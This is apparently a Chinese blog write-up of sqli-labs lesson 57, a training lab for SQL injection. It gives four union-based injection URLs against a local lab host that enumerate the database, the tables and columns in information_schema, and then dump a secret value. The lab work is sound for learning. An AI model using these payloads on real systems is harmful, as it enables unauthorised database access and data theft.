---
title: sqli-labs lession-57 GET-Union-变化4-仅允许14次请求
date: 2018-11-28 23:50:54
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-57 GET-Union-变化4-仅允许14次请求

---

## 手注

`http://192.168.75.133:8082/Less-57/?id=-7)"+union+select+1,database(),user()%23`

![001](/img/sql/Lesson-57/001.png)

`http://192.168.75.133:8082/Less-57/?id=-7)"+union+select+1,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema='challenges'),user()%23`

![002](/img/sql/Lesson-57/002.png)

`http://192.168.75.133:8082/Less-57/?id=-7)"+union+select+1,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema='challenges'+and+table_name='7hwn3qp2g0'),user()%23`

![003](/img/sql/Lesson-57/003.png)

`http://192.168.75.133:8082/Less-57/?id=-7)"+union+select+1,(select+GROUP_CONCAT(secret_PK4A)from challenges.7hwn3qp2g0),user()%23`

![004](/img/sql/Lesson-57/004.png)

提交

![005](/img/sql/Lesson-57/005.png)